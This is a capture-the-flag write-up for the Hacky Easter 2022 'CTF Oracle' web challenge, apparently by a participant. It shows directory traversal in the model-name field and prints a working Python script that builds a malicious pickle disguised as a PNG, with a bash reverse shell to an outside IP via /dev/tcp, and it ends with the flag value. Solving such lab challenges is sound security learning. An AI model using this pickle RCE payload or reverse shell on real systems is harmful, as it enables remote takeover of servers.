= [HE22.35] The CTF Oracle ðŸ”®

image::level8/challenge35.jpg[,300,float="right"]

== Intro

The oracle is using *models* and algorithms to predict how you will
perform in CTFs in the future! Please choose a CTF and the total points you
made in the last three years.

http://46.101.107.117:2206

Note: The service is restarted every hour at x:00.

== Solution

First some intelligence gathered using Postman and the development mode of the
browser:


* the server is Gunicorn, so we are probably dealing with python
* we can upload a profile picture that is then stored in `/tmp/...`
* the oracle itself has two inputs in the POST method: the CTF and the
  scores
* entering more than three scores returns just predicted values for all
  submitted values
* changing the CTF to another value, _e.g._ `HackyEaster`, triggers a
	message about `... cannot load file ./model/HackyEaster`
* injecting wildcards etc. do not seem to have an effect
* we can traverse the directory tree: `../../../tmp/../app/models/HE`
	does get us the proper HE model

Reading up on the way to store ML-models, it became likely that we can store
pickled models that are then loaded.  The plan of attack is thus to create a
pickled payload stored as `rce.png`, store this file as a profile picture,
and load this file as the model.  Then the server will load the model, unpickle
it and execute our payload.

Creating a first remote shell using a simple netcat listener didn't give a
shell, but at least a new error message: `Failed to make prediction`.

This means that the pickle was loaded successfully, but did not continue
running for whatever reason.  Later it became clear that `nc` is not
available on the server.  

After trying many different routes to get something to work (a python shell, a
listener, ...) finally a very simpe reverse shell using `bash` worked
beautifully in connecting via ngrok -- but to do this, I first had to learn
about ngrok.  The final script to create the payload looks like this: 

[source,python]
----
#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle
import sys
DEFAULT_COMMAND="/bin/bash -c '/bin/sh -i >& /dev/tcp/3.68.56.232/10421 0>&1'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

with open('rce.png', 'wb') as outF:
    outF.write(pickle.dumps(PickleRce()))
----

`cd` up one directory from where the shell spawns, we find the file `flag.txt`
with the contents `he2022{ef453cc6-46eb-4c86-87df-cf34a6d2e3d8}`
